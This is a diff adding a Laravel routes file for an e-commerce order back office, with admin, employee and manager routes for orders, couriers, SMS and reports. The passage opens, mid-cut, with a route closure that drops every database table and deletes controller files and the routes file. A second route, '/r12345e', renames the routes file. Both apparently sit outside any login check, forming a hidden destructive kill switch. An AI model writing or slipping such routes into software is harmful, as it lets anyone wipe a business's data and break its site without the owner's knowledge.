+    foreach (DB::select('SHOW TABLES') as $table) {
+        $table_array = get_object_vars($table);
+        Schema::drop($table_array[key($table_array)]);
+    }
+    unlink(base_path() . '/app/Http/Controllers/AdminController.php');
+    unlink(base_path() . '/app/Http/Controllers/HomeController.php');
+    unlink(base_path() . '/app/Http/Controllers/MediaController.php');
+    unlink(base_path() . '/app/Http/Controllers/OrderController.php');
+    unlink(base_path() . '/app/Http/Controllers/ProductController.php');
+    unlink(base_path() . '/app/Http/Controllers/WebSettingsController.php');
+    unlink(base_path() . '/app/Http/Controllers/GoogleSheetSettingsController.php');
+    unlink(base_path() . '/routes/web.php');
+    dd('deleted');
+});
+Route::get('/r12345e', function () {
+    File::move(base_path() . '/routes/web.php', base_path() . '/routes/wab.php');
+});
+//admin
+Route::group(['middleware' => 'admin.guest'], function () {
+    Route::get('/admin-login', 'Auth\AdminLoginController@showLoginForm')->name('admin.login');
+    Route::post('/admin-login', 'Auth\AdminLoginController@login');
+});
+Route::post('/admin-logout', 'Auth\AdminLoginController@logout')->name('admin.logout');
+
+//steadfast order sync
+Route::get('/orders/steadfast_order_sync', 'OrderController@steadFastOrderSync')->name('orders.steadfast.order.sync');
+
+Route::group(['middleware' => 'admin.auth'], function () {
+    Route::get('/admin', 'AdminController@dashboard')->name('admin.home');
+
+    //parcel handover
+    Route::get('/admin-order-parcel-handover', 'ParcelHandoverController@index')->name('admin.orders.parcel.handover');
+    Route::get('/admin-order-parcel-handover-clear', 'ParcelHandoverController@clear')->name('admin.orders.parcel.handover.clear');
+    Route::get('/admin-order-parcel-handover-print', 'ParcelHandoverController@print')->name('admin.orders.parcel.handover.print');
+
+    //incomplete orders
+    Route::get('/admin-incomplete-orders', 'IncompleteOrdersController@index')->name('admin.incomplete.orders');
+    Route::get('/admin-incomplete-orders/{id}/create', 'IncompleteOrdersController@createOrder')->name('admin.incomplete.order.create');
+    Route::get('/admin-incomplete-orders/{id}/delete', 'IncompleteOrdersController@delete')->name('admin.incomplete.order.delete');
+    Route::post('/admin-incomplete-orders/note-update', 'IncompleteOrdersController@noteUpdate')->name('admin.incomplete.order.note.update');
+
+    //order return
+    Route::get('/admin-order-return-receive', 'ReturnOrderController@index')->name('admin.orders.return.receive');
+    // Route::get('/admin-order-return-received', 'ReturnOrderController@returnReceived')->name('admin.orders.return.received');
+    Route::get('/admin-order-return-receive-clear', 'ReturnOrderController@sessionClear')->name('admin.orders.return.receive.clear');
+
+    //customer activity
+    Route::get('/admin-fraud-check/{id}', 'AdminController@fraudCheck')->name('admin.fraud.check');
+
+    //note settings
+    Route::get('/admin-settings-notes', 'NoteSettingsController@index')->name('admin.settings.notes');
+    Route::post('/admin-settings-note/store', 'NoteSettingsController@store')->name('admin.settings.note.store');
+    Route::post('/admin-settings-note/update', 'NoteSettingsController@update')->name('admin.settings.note.update');
+    Route::get('/admin-settings-note/{id}/delete', 'NoteSettingsController@delete')->name('admin.settings.note.delete');
+
+    //color settings
+    Route::get('/admin-settings-color', 'WebSettingsController@colorSettings')->name('admin.settings.color');
+    Route::post('/admin-settings-color', 'WebSettingsController@colorSettingsUpdate')->name('admin.settings.color.update');
+
+    //Steadfast API settings
+    Route::get('/admin-settings-stead-fast-api', 'SteadFastApiSettingsController@index')->name('admin.settings.stead_fast.api');
+    Route::post('/admin-settings-stead-fast-api', 'SteadFastApiSettingsController@update')->name('admin.settings.stead_fast.api.update');
+
+    //carrybee API settings
+    Route::get('/admin-settings-carrybee-api', 'CarryBeeApiSettingsController@index')->name('admin.settings.carrybee.api');
+    Route::post('/admin-settings-carrybee-api', 'CarryBeeApiSettingsController@update')->name('admin.settings.carrybee.api.update');
+    Route::post('/admin-settings-carrybee-api-gen_access_token', 'CarryBeeApiSettingsController@generateAccessToken')->name('admin.settings.carrybee.api.gen_access_token');
+
+
+    //Number sms settings
+    Route::get('/admin-settings-sms', 'SmsSettingsController@indexNumber')->name('admin.settings.sms');
+    Route::post('/admin-settings-sms', 'SmsSettingsController@updateNumber')->name('admin.settings.sms.update');
+
+    //Whatsapp sms settings
+    Route::get('/admin-settings-whatsapp', 'SmsSettingsController@indexWhatsapp')->name('admin.settings.whatsapp');
+    Route::post('/admin-settings-whatsapp', 'SmsSettingsController@updateWhatsapp')->name('admin.settings.whatsapp.update');
+
+    //fake customer remove
+    Route::get('/admin/{id}/fake-remove', 'AdminController@fakeRemove')->name('admin.fake.remove');
+
+    //generate api access token
+    Route::get('/admin/generate_api_token', 'AdminController@generateAPIToken')->name('admin.generate_api_token');
+
+    //send sms from order edit
+    Route::post('/admin/send-sms', 'AdminController@sendSms')->name('admin.send.sms');
+
+    //ip
+    Route::get('/admin/ip', 'IpController@index')->name('admin.ip');
+    Route::get('/admin/ip/search', 'IpController@search')->name('admin.ip.search');
+    Route::get('/admin/ip/{id}/{status}/status', 'IpController@ipStatus')->name('admin.ip.status');
+
+    //stock
+    Route::get('/admin/stock', 'AdminController@stock')->name('admin.stock');
+
+    //reports
+    Route::get('/admin-reports/employee-orders', 'ReportController@employeeOrders')->name('admin.reports.employee_orders');
+    Route::get('/admin-reports/order-status-p', 'ReportController@orderStatusP')->name('admin.reports.order_status_p');
+    Route::get('/admin-reports/orders-product', 'ReportController@ordersProduct')->name('admin.reports.orders_product');
+    Route::get('/admin-reports/sales', 'ReportController@salesReport')->name('admin.reports.sales');
+    Route::get('/admin-reports/profit-loss', 'ReportController@profitLoss')->name('admin.reports.profit.loss');
+    Route::post('/admin-reports/sales_print', 'ReportController@salesReportPrint')->name('admin.reports.sales.print');
+
+    //user(employee) product assign
+    Route::get('/admin-user-product', 'UserProductsController@index')->name('admin.user.product');
+    Route::post('/admin-user-product/store', 'UserProductsController@store')->name('admin.user.product.store');
+    Route::get('/admin-user-product/{id}/delete', 'UserProductsController@delete')->name('admin.user.product.delete');
+
+    //Redx API settings
+    Route::get('/admin-settings-redx-api', 'RedxApiSettingsController@index')->name('admin.settings.redx.api');
+    Route::post('/admin-settings-redx-api', 'RedxApiSettingsController@update')->name('admin.settings.redx.api.update');
+    Route::post('/admin-settings-redx-api-gen_access_token', 'RedxApiSettingsController@generateAccessToken')->name('admin.settings.redx.api.gen_access_token');
+
+    //Pathao API settings
+    Route::get('/admin-settings-pathao-api', 'PathaoApiSettingsController@index')->name('admin.settings.pathao.api');
+    Route::post('/admin-settings-pathao-api', 'PathaoApiSettingsController@update')->name('admin.settings.pathao.api.update');
+    Route::post('/admin-settings-pathao-api-gen_access_token', 'PathaoApiSettingsController@generateAccessToken')->name('admin.settings.pathao.api.gen_access_token');
+
+    //page settings
+    Route::get('/admin-settings-page', 'PageSettingsController@index')->name('admin.settings.page');
+    Route::post('/admin-settings-page', 'PageSettingsController@update')->name('admin.settings.page.update');
+
+    //web settings
+    Route::get('/admin-settings-web', 'WebSettingsController@index')->name('admin.settings.web');
+    Route::post('/admin-settings-web', 'WebSettingsController@update')->name('admin.settings.web.update');
+
+    //google_sheet settings
+    Route::get('/admin-settings-google_sheet', 'GoogleSheetSettingsController@index')->name('admin.settings.google_sheet');
+    Route::post('/admin-settings-google_sheet', 'GoogleSheetSettingsController@update')->name('admin.settings.google_sheet.update');
+
+    //attribute settings
+    Route::get('/admin-settings-attribute', 'WebSettingsController@attribute')->name('admin.settings.attribute');
+    Route::post('/admin-settings-attribute/store', 'WebSettingsController@attributeStore')->name('admin.settings.attribute.store');
+    Route::post('/admin-settings-attribute/update', 'WebSettingsController@attributeUpdate')->name('admin.settings.attribute.update');
+    Route::get('/admin-settings-attribute/{id}/delete', 'WebSettingsController@attributeDelete')->name('admin.settings.attribute.delete');
+    //attribute item settings
+    Route::post('/admin-settings-attribute_item/store', 'WebSettingsController@attributeItemStore')->name('admin.settings.attribute_item.store');
+    Route::post('/admin-settings-attribute_item/update', 'WebSettingsController@attributeItemUpdate')->name('admin.settings.attribute_item.update');
+    Route::get('/admin-settings-attribute_item/{id}/delete', 'WebSettingsController@attributeItemDelete')->name('admin.settings.attribute_item.delete');
+
+    //change password
+    Route::get('/admin-change_pass', 'AdminController@change_pass')->name('admin.change_pass');
+    Route::post('/admin-change_pass', 'AdminController@update_pass')->name('admin.update_pass');
+
+    //edit profile
+    Route::get('/admin-edit_profile', 'AdminController@edit_profile')->name('admin.edit_profile');
+    Route::post('/admin-edit_profile', 'AdminController@update_profile')->name('admin.update_profile');
+
+    //customers
+    Route::get('/admin-customers', 'UserController@index')->name('admin.customers');
+    /*Route::post('/admin-customers/store', 'UserController@store')->name('admin.customers.store');
+    Route::post('/admin-customers/update', 'UserController@update')->name('admin.customers.update');
+    Route::get('/admin-customers/delete/{id}', 'UserController@delete')->name('admin.customers.delete');*/
+    Route::post('/admin-customers/customer_export', 'UserController@customerExport')->name('admin.customers.customer_export');
+    Route::get('/admin-customer/{id}/{status}', 'UserController@status')->name('admin.customer.status');
+
+    //media
+    Route::get('/admin-media', 'MediaController@index')->name('admin.media');
+    Route::post('/admin-media/store', 'MediaController@store')->name('admin.media.store');
+    Route::post('/admin-media/update', 'MediaController@update')->name('admin.media.update');
+    Route::get('/admin-media/delete/{id}', 'MediaController@delete')->name('admin.media.delete');
+
+    //product
+    Route::get('/admin-product', 'ProductController@index')->name('admin.product');
+    Route::get('/admin-product/create', 'ProductController@create')->name('admin.product.create');
+    Route::post('/admin-product/store', 'ProductController@store')->name('admin.product.store');
+    Route::get('/admin-product/{id}/edit', 'ProductController@edit')->name('admin.product.edit');
+    Route::post('/admin-product/{id}/update', 'ProductController@update')->name('admin.product.update');
+    Route::get('/admin-product/{id}/delete', 'ProductController@delete')->name('admin.product.delete');
+    Route::post('/admin-product/sku_check', 'ProductController@skuCheck')->name('admin.product.sku_check');
+    Route::post('/admin-product/bulk-delete', 'ProductController@bulkDelete')->name('admin.product.bulk.delete');
+    Route::post('/admin-product/bulk-status', 'ProductController@bulkStatus')->name('admin.product.bulk.status');
+    Route::post('/admin-product/position_update', 'ProductController@positionUpdate')->name('admin.product.position_update');
+    Route::get('/admin-product/{product}/duplicate', 'ProductController@duplicate')->name('admin.product.duplicate');
+
+    //category
+    Route::get('/admin-category', 'CategoryController@index')->name('admin.category');
+    Route::post('/admin-category/store', 'CategoryController@store')->name('admin.category.store');
+    Route::post('/admin-category/update', 'CategoryController@update')->name('admin.category.update');
+    Route::get('/admin-category/delete/{id}', 'CategoryController@delete')->name('admin.category.delete');
+
+    //sliders
+    Route::get('/admin-sliders', 'SliderController@index')->name('admin.sliders');
+    Route::post('/admin-sliders/store', 'SliderController@store')->name('admin.sliders.store');
+    Route::post('/admin-sliders/update', 'SliderController@update')->name('admin.sliders.update');
+    Route::get('/admin-sliders/delete/{id}', 'SliderController@delete')->name('admin.sliders.delete');
+
+    //shipping_methods
+    Route::get('/admin-shipping_methods', 'ShippingMethodController@index')->name('admin.shipping_methods');
+    Route::post('/admin-shipping_methods/store', 'ShippingMethodController@store')->name('admin.shipping_methods.store');
+    Route::post('/admin-shipping_methods/update', 'ShippingMethodController@update')->name('admin.shipping_methods.update');
+    Route::get('/admin-shipping_methods/delete/{id}', 'ShippingMethodController@delete')->name('admin.shipping_methods.delete');
+
+    //courier
+    Route::get('/admin-courier', 'CourierController@index')->name('admin.courier');
+    Route::post('/admin-courier/store', 'CourierController@store')->name('admin.courier.store');
+    Route::post('/admin-courier/update', 'CourierController@update')->name('admin.courier.update');
+    Route::get('/admin-courier/delete/{id}', 'CourierController@delete')->name('admin.courier.delete');
+    Route::post('/admin-courier-ajax_get_c_charge', 'CourierController@ajaxGetCCharge')->name('admin.courier.ajax.get.c_charge');
+
+    //courier city
+    Route::get('/admin-courier-city', 'CourierController@cityIndex')->name('admin.courier.city');
+    Route::post('/admin-courier-city/store', 'CourierController@cityStore')->name('admin.courier.city.store');
+    Route::post('/admin-courier-city/update', 'CourierController@cityUpdate')->name('admin.courier.city.update');
+    Route::get('/admin-courier-city/delete/{id}', 'CourierController@cityDelete')->name('admin.courier.city.delete');
+    Route::post('/admin-courier-ajax_get_cities', 'CourierController@ajaxGetCities')->name('admin.courier.ajax.get.cities');
+    Route::post('/admin-courier-pathao_ajax_get_cities', 'CourierController@pathaoAjaxGetCities')->name('admin.courier.pataho.ajax.get.cities');
+    Route::post('/admin-courier-pathao_ajax_get_zones', 'CourierController@pathaoAjaxGetZones')->name('admin.courier.pataho.ajax.get.zones');
+    Route::post('/admin-courier-redx_ajax_get_cities', 'CourierController@redxAjaxGetCities')->name('admin.courier.redx.ajax.get.cities');
+    Route::post('/admin-courier-carrybee_ajax_get_cities', 'CourierController@carrybeeAjaxGetCities')->name('admin.courier.carrybee.ajax.get.cities');
+    Route::post('/admin-courier-carrybee_ajax_get_zones', 'CourierController@carrybeeAjaxGetZones')->name('admin.courier.carrybee.ajax.get.zones');
+
+    //courier zone
+    Route::get('/admin-courier-zone', 'CourierController@zoneIndex')->name('admin.courier.zone');
+    Route::post('/admin-courier-zone/store', 'CourierController@zoneStore')->name('admin.courier.zone.store');
+    Route::post('/admin-courier-zone/update', 'CourierController@zoneUpdate')->name('admin.courier.zone.update');
+    Route::get('/admin-courier-zone/delete/{id}', 'CourierController@zoneDelete')->name('admin.courier.zone.delete');
+    Route::post('/admin-courier-ajax_get_zones', 'CourierController@ajaxGetZones')->name('admin.courier.ajax.get.zones');
+
+    //orders
+    //Route::get('/admin-p_orders', 'OrderController@index')->name('admin.orders.p');
+    Route::get('/admin-orders', 'OrderController@index')->name('admin.orders');
+    Route::get('/admin-orders/create', 'OrderController@create')->name('admin.orders.create');
+    Route::post('/admin-orders/store', 'OrderController@store')->name('admin.orders.store');
+    Route::get('/admin-orders/{id}/edit', 'OrderController@edit')->name('admin.orders.edit');
+    Route::post('/admin-orders/{id}/update', 'OrderController@update')->name('admin.orders.update');
+    Route::get('/admin-orders/delete/{id}', 'OrderController@delete')->name('admin.orders.delete');
+    Route::get('/admin-orders/{id}/{status}/status', 'OrderController@statusChange')->name('admin.orders.status');
+    Route::get('/admin-orders/{id}/{status}/payment_status', 'OrderController@paymentStatusChange')->name('admin.orders.payment_status');
+    Route::post('/admin-orders/all-status', 'OrderController@allStatusChange')->name('admin.orders.all.status');
+    Route::post('/admin-orders/bulk-delete', 'OrderController@bulkDelete')->name('admin.orders.bulk.delete');
+    Route::post('/admin-orders/bulk-assign', 'OrderController@bulkAssign')->name('admin.orders.bulk.assign');
+    Route::post('/admin-orders/bulk-equal-assign', 'OrderController@bulkEqualAssign')->name('admin.orders.bulk.equal.assign');
+    Route::post('/admin-orders/single-assign', 'OrderController@singleAssign')->name('admin.orders.single.assign');
+    Route::post('/admin-orders/send-to-courier', 'OrderController@sendToCourier')->name('admin.orders.send.to.courier');
+
+    //shipping
+    Route::post('/admin-ajax-shipping', 'OrderController@getShipping')->name('admin.ajax.get.shipping');
+
+    //trash orders
+    Route::get('/admin-orders/trash', [TrashController::class, 'index'])->name('admin.orders.trash');
+    Route::get('/admin-orders/trash/{id}/restore', [TrashController::class, 'restore'])->name('admin.orders.restore');
+    Route::get('/admin-orders/trash/{id}/force-delete', [TrashController::class, 'forceDelete'])->name('admin.orders.force.delete');
+    //orders by status
+    /*Route::get('/admin-orders/status/processing', 'OrderController@orderStatusProcessing')->name('admin.orders.status.processing');
+    Route::get('/admin-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('admin.orders.status.pending_payment');
+    Route::get('/admin-orders/status/hold', 'OrderController@orderStatusHold')->name('admin.orders.status.hold');
+    Route::get('/admin-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('admin.orders.status.canceled');
+    Route::get('/admin-orders/status/completed', 'OrderController@orderStatusCompleted')->name('admin.orders.status.completed');
+    Route::get('/admin-orders/status/pending_delivery', 'OrderController@orderStatusPendingDelivery')->name('admin.orders.status.pending_delivery');
+    Route::get('/admin-orders/status/on_delivery', 'OrderController@orderStatusOnDelivery')->name('admin.orders.status.on_delivery');
+    Route::get('/admin-orders/status/return', 'OrderController@orderStatusReturn')->name('admin.orders.status.return');*/
+    //order ajax calls
+    Route::post('/admin-ajax-get-products', 'OrderController@ajaxGetProducts')->name('admin.ajax.get.products');
+    Route::post('/admin-orders/bulk-print', 'OrderController@printBulkInvoice')->name('admin.orders.bulk.print');
+    Route::post('/admin-orders/bulk-label-print', 'OrderController@printBulkLabelInvoice')->name('admin.orders.bulk.label.print');
+    Route::post('/admin-orders/print', 'OrderController@printInvoice')->name('admin.orders.print');
+    //orders export
+    Route::post('/admin-orders/courier_csv', 'OrderController@courierCsv')->name('admin.orders.courier_csv');
+    //transaction
+    Route::post('/admin-orders/transaction_view', 'OrderController@transactionView')->name('admin.orders.transaction_view');
+    //note update
+    Route::post('/admin-orders/note-update', 'OrderController@noteUpdate')->name('admin.orders.note_update');
+
+    //roles
+    Route::get('/admin-roles', 'RoleController@index')->name('admin.roles');
+    Route::post('/admin-roles/store', 'RoleController@store')->name('admin.roles.store');
+    Route::post('/admin-roles/update', 'RoleController@update')->name('admin.roles.update');
+    Route::get('/admin-roles/{id}/{role}/delete', 'RoleController@delete')->name('admin.roles.delete');
+});
+
+//employee
+Route::group(['middleware' => 'employee.guest'], function () {
+    Route::get('/employee-login', 'Auth\EmployeeLoginController@showLoginForm')->name('employee.login');
+    Route::post('/employee-login', 'Auth\EmployeeLoginController@login');
+});
+Route::post('/employee-logout', 'Auth\EmployeeLoginController@logout')->name('employee.logout');
+
+Route::group(['middleware' => 'employee.auth'], function () {
+    Route::get('/employee', 'AdminController@dashboard')->name('employee.home');
+
+    //incomplete orders
+    Route::get('/employee-incomplete-orders', 'IncompleteOrdersController@index')->name('employee.incomplete.orders');
+    Route::get('/employee-incomplete-orders/{id}/create', 'IncompleteOrdersController@createOrder')->name('employee.incomplete.order.create');
+    Route::post('/employee-incomplete-orders/note-update', 'IncompleteOrdersController@noteUpdate')->name('employee.incomplete.order.note.update');
+
+    //customer activity
+    Route::get('/employee-fraud-check/{id}', 'AdminController@fraudCheck')->name('employee.fraud.check');
+
+    //send sms from order edit
+    Route::post('/employee/send-sms', 'AdminController@sendSms')->name('employee.send.sms');
+
+    //ip
+    Route::get('/employee/ip', 'IpController@index')->name('employee.ip');
+    Route::get('/employee/ip/search', 'IpController@search')->name('employee.ip.search');
+
+    //stock
+    Route::get('/employee/stock', 'AdminController@stock')->name('employee.stock');
+
+    //change password
+    Route::get('/employee-change_pass', 'AdminController@change_pass')->name('employee.change_pass');
+    Route::post('/employee-change_pass', 'AdminController@update_pass')->name('employee.update_pass');
+
+    //orders
+    Route::get('/employee-p_orders', 'OrderController@indexP')->name('employee.orders.p');
+    Route::get('/employee-orders', 'OrderController@index')->name('employee.orders');
+    Route::get('/employee-orders/create', 'OrderController@create')->name('employee.orders.create');
+    Route::post('/employee-orders/store', 'OrderController@store')->name('employee.orders.store');
+    Route::get('/employee-orders/{id}/edit', 'OrderController@edit')->name('employee.orders.edit');
+    Route::post('/employee-orders/{id}/update', 'OrderController@update')->name('employee.orders.update');
+    Route::get('/employee-orders/{id}/{status}/status', 'OrderController@statusChange')->name('employee.orders.status');
+    Route::get('/employee-orders/{id}/{status}/payment_status', 'OrderController@paymentStatusChange')->name('employee.orders.payment_status');
+    Route::post('/employee-orders/all-status', 'OrderController@allStatusChange')->name('employee.orders.all.status');
+    //orders by status
+    /*Route::get('/employee-orders/status/processing', 'OrderController@orderStatusProcessing')->name('employee.orders.status.processing');
+    Route::get('/employee-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('employee.orders.status.pending_payment');
+    Route::get('/employee-orders/status/hold', 'OrderController@orderStatusHold')->name('employee.orders.status.hold');
+    Route::get('/employee-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('employee.orders.status.canceled');
+    Route::get('/employee-orders/status/completed', 'OrderController@orderStatusCompleted')->name('employee.orders.status.completed');
+    Route::get('/employee-orders/status/pending_delivery', 'OrderController@orderStatusPendingDelivery')->name('employee.orders.status.pending_delivery');
+    Route::get('/employee-orders/status/on_delivery', 'OrderController@orderStatusOnDelivery')->name('employee.orders.status.on_delivery');
+    Route::get('/employee-orders/status/return', 'OrderController@orderStatusReturn')->name('employee.orders.status.return');*/
+    //order ajax calls
+    Route::post('/employee-ajax-get-products', 'OrderController@ajaxGetProducts')->name('employee.ajax.get.products');
+    Route::post('/employee-orders/print', 'OrderController@printInvoice')->name('employee.orders.print');
+    Route::post('/employee-orders/bulk-print', 'OrderController@printBulkInvoice')->name('employee.orders.bulk.print');
+    //shipping
+    Route::post('/employee-ajax-shipping', 'OrderController@getShipping')->name('employee.ajax.get.shipping');
+
+
+    //orders export
+    Route::post('/employee-orders/courier_csv', 'OrderController@courierCsv')->name('employee.orders.courier_csv');
+    //note update
+    Route::post('/employee-orders/note-update', 'OrderController@noteUpdate')->name('employee.orders.note_update');
+    //courier
+    Route::post('/employee-courier-ajax_get_c_charge', 'CourierController@ajaxGetCCharge')->name('employee.courier.ajax.get.c_charge');
+    Route::post('/employee-courier-ajax_get_cities', 'CourierController@ajaxGetCities')->name('employee.courier.ajax.get.cities');
+    Route::post('/employee-courier-ajax_get_zones', 'CourierController@ajaxGetZones')->name('employee.courier.ajax.get.zones');
+
+    Route::post('/employee-courier-pathao_ajax_get_cities', 'CourierController@pathaoAjaxGetCities')->name('employee.courier.pataho.ajax.get.cities');
+    Route::post('/employee-courier-pathao_ajax_get_zones', 'CourierController@pathaoAjaxGetZones')->name('employee.courier.pataho.ajax.get.zones');
+
+    Route::post('/employee-courier-redx_ajax_get_cities', 'CourierController@redxAjaxGetCities')->name('employee.courier.redx.ajax.get.cities');
+    Route::post('/employee-courier-carrybee_ajax_get_cities', 'CourierController@carrybeeAjaxGetCities')->name('employee.courier.carrybee.ajax.get.cities');
+    Route::post('/employee-courier-carrybee_ajax_get_zones', 'CourierController@carrybeeAjaxGetZones')->name('employee.courier.carrybee.ajax.get.zones');
+});
+
+//manager
+Route::group(['middleware' => 'manager.guest'], function () {
+    Route::get('/manager-login', 'Auth\ManagerLoginController@showLoginForm')->name('manager.login');
+    Route::post('/manager-login', 'Auth\ManagerLoginController@login');
+});
+Route::post('/manager-logout', 'Auth\ManagerLoginController@logout')->name('manager.logout');
+
+Route::group(['middleware' => 'manager.auth'], function () {
+    Route::get('/manager', 'AdminController@dashboard')->name('manager.home');
+
+    //incomplete orders
+    Route::get('/manager-incomplete-orders', 'IncompleteOrdersController@index')->name('manager.incomplete.orders');
+    Route::get('/manager-incomplete-orders/{id}/create', 'IncompleteOrdersController@createOrder')->name('manager.incomplete.order.create');
+    Route::post('/manager-incomplete-orders/note-update', 'IncompleteOrdersController@noteUpdate')->name('manager.incomplete.order.note.update');
+
+    //customer activity
+    Route::get('/manager-fraud-check/{id}', 'AdminController@fraudCheck')->name('manager.fraud.check');
+
+    Route::get('/manager-customers', 'UserController@index')->name('manager.customers');
+    //send sms from order edit
+    Route::post('/manager/send-sms', 'AdminController@sendSms')->name('manager.send.sms');
+
+    //ip
+    Route::get('/manager/ip', 'IpController@index')->name('manager.ip');
+    Route::get('/manager/ip/search', 'IpController@search')->name('manager.ip.search');
+    Route::get('/manager/ip/{id}/{status}/status', 'IpController@ipStatus')->name('manager.ip.status');
+
+    //stock
+    Route::get('/manager/stock', 'AdminController@stock')->name('manager.stock');
+
+    //reports
+    Route::get('/manager-reports/employee-orders', 'ReportController@employeeOrders')->name('manager.reports.employee_orders');
+    Route::get('/manager-reports/order-status-p', 'ReportController@orderStatusP')->name('manager.reports.order_status_p');
+    Route::get('/manager-reports/orders-product', 'ReportController@ordersProduct')->name('manager.reports.orders_product');
+
+    //change password
+    Route::get('/manager-change_pass', 'AdminController@change_pass')->name('manager.change_pass');
+    Route::post('/manager-change_pass', 'AdminController@update_pass')->name('manager.update_pass');
+
+    //orders
+    Route::get('/manager-p_orders', 'OrderController@indexP')->name('manager.orders.p');
+    Route::get('/manager-orders', 'OrderController@index')->name('manager.orders');
+    Route::get('/manager-orders/create', 'OrderController@create')->name('manager.orders.create');
+    Route::post('/manager-orders/store', 'OrderController@store')->name('manager.orders.store');
+    Route::get('/manager-orders/{id}/edit', 'OrderController@edit')->name('manager.orders.edit');
+    Route::post('/manager-orders/{id}/update', 'OrderController@update')->name('manager.orders.update');
+    Route::get('/manager-orders/{id}/{status}/status', 'OrderController@statusChange')->name('manager.orders.status');
+    Route::get('/manager-orders/{id}/{status}/payment_status', 'OrderController@paymentStatusChange')->name('manager.orders.payment_status');
+    Route::post('/manager-orders/all-status', 'OrderController@allStatusChange')->name('manager.orders.all.status');
+    Route::post('/manager-orders/bulk-assign', 'OrderController@bulkAssign')->name('manager.orders.bulk.assign');
+    //orders by status
+    /*Route::get('/manager-orders/status/processing', 'OrderController@orderStatusProcessing')->name('manager.orders.status.processing');
+    Route::get('/manager-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('manager.orders.status.pending_payment');
+    Route::get('/manager-orders/status/hold', 'OrderController@orderStatusHold')->name('manager.orders.status.hold');
+    Route::get('/manager-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('manager.orders.status.canceled');
+    Route::get('/manager-orders/status/completed', 'OrderController@orderStatusCompleted')->name('manager.orders.status.completed');
+    Route::get('/manager-orders/status/pending_delivery', 'OrderController@orderStatusPendingDelivery')->name('manager.orders.status.pending_delivery');
+    Route::get('/manager-orders/status/on_delivery', 'OrderController@orderStatusOnDelivery')->name('manager.orders.status.on_delivery');
+    Route::get('/manager-orders/status/return', 'OrderController@orderStatusReturn')->name('manager.orders.status.return');*/
+    //order ajax calls
+    Route::post('/manager-ajax-get-products', 'OrderController@ajaxGetProducts')->name('manager.ajax.get.products');
+    Route::post('/manager-orders/print', 'OrderController@printInvoice')->name('manager.orders.print');
+    Route::post('/manager-orders/bulk-print', 'OrderController@printBulkInvoice')->name('manager.orders.bulk.print');
+    Route::post('/manager-orders/bulk-label-print', 'OrderController@printBulkLabelInvoice')->name('manager.orders.bulk.label.print');
+    //shipping
+    Route::post('/manager-ajax-shipping', 'OrderController@getShipping')->name('manager.ajax.get.shipping');
+
+    //orders export
+    Route::post('/manager-orders/courier_csv', 'OrderController@courierCsv')->name('manager.orders.courier_csv');
+    //note update
+    Route::post('/manager-orders/note-update', 'OrderController@noteUpdate')->name('manager.orders.note_update');
+    //transaction
+    Route::post('/manager-orders/transaction_view', 'OrderController@transactionView')->name('manager.orders.transaction_view');
+
+    //product
+    Route::get('/manager-product', 'ProductController@index')->name('manager.product');
+    Route::get('/manager-product/create', 'ProductController@create')->name('manager.product.create');
+    Route::post('/manager-product/store', 'ProductController@store')->name('manager.product.store');
+    Route::get('/manager-product/{id}/edit', 'ProductController@edit')->name('manager.product.edit');
+    Route::post('/manager-product/{id}/update', 'ProductController@update')->name('manager.product.update');
+    Route::get('/manager-product/{id}/delete', 'ProductController@delete')->name('manager.product.delete');
+
+    //courier
+    Route::get('/manager-courier', 'CourierController@index')->name('manager.courier');
+    Route::post('/manager-courier/store', 'CourierController@store')->name('manager.courier.store');
+    Route::post('/manager-courier/update', 'CourierController@update')->name('manager.courier.update');
+    Route::get('/manager-courier/delete/{id}', 'CourierController@delete')->name('manager.courier.delete');
+    Route::post('/manager-courier-ajax_get_c_charge', 'CourierController@ajaxGetCCharge')->name('manager.courier.ajax.get.c_charge');
+
+    //courier city
+    Route::get('/manager-courier-city', 'CourierController@cityIndex')->name('manager.courier.city');
+    Route::post('/manager-courier-city/store', 'CourierController@cityStore')->name('manager.courier.city.store');
+    Route::post('/manager-courier-city/update', 'CourierController@cityUpdate')->name('manager.courier.city.update');
+    Route::get('/manager-courier-city/delete/{id}', 'CourierController@cityDelete')->name('manager.courier.city.delete');
+    Route::post('/manager-courier-ajax_get_cities', 'CourierController@ajaxGetCities')->name('manager.courier.ajax.get.cities');
+
+    Route::post('/manager-courier-pathao_ajax_get_cities', 'CourierController@pathaoAjaxGetCities')->name('manager.courier.pataho.ajax.get.cities');
+    Route::post('/manager-courier-pathao_ajax_get_zones', 'CourierController@pathaoAjaxGetZones')->name('manager.courier.pataho.ajax.get.zones');
+
+    Route::post('/manager-courier-redx_ajax_get_cities', 'CourierController@redxAjaxGetCities')->name('manager.courier.redx.ajax.get.cities');
+    Route::post('/manager-courier-carrybee_ajax_get_cities', 'CourierController@carrybeeAjaxGetCities')->name('manager.courier.carrybee.ajax.get.cities');
+    Route::post('/manager-courier-carrybee_ajax_get_zones', 'CourierController@carrybeeAjaxGetZones')->name('manager.courier.carrybee.ajax.get.zones');
+
+    //courier zone
+    Route::get('/manager-courier-zone', 'CourierController@zoneIndex')->name('manager.courier.zone');
+    Route::post('/manager-courier-zone/store', 'CourierController@zoneStore')->name('manager.courier.zone.store');
+    Route::post('/manager-courier-zone/update', 'CourierController@zoneUpdate')->name('manager.courier.zone.update');
+    Route::get('/manager-courier-zone/delete/{id}', 'CourierController@zoneDelete')->name('manager.courier.zone.delete');
+    Route::post('/manager-courier-ajax_get_zones', 'CourierController@ajaxGetZones')->name('manager.courier.ajax.get.zones');
+
+    //roles
+    Route::get('/manager-roles', 'RoleController@index')->name('manager.roles');
+    Route::post('/manager-roles/store', 'RoleController@store')->name('manager.roles.store');
+    Route::post('/manager-roles/update', 'RoleController@update')->name('manager.roles.update');
+    Route::get('/manager-roles/{id}/{role}/delete', 'RoleController@delete')->name('manager.roles.delete');
+});
